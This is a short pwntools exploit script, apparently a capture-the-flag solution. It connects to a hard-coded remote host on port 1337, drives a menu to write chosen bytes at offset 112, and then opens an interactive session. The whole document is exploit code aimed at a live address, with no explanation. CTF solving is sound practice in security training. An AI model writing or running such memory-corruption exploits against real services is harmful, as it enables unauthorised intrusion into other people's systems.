from pwn import *

p = remote("13.234.20.50", 1337)


p.sendlineafter(b">", b"1")
p.sendlineafter(b"Offset: ", b"112")
p.sendlineafter(b"Size (max 8): ", b"8")
p.sendlineafter(b"Data (hex bytes, e.g. cafebabe):", b"03000000")
p.sendlineafter(b">", b"2")

p.interactive()
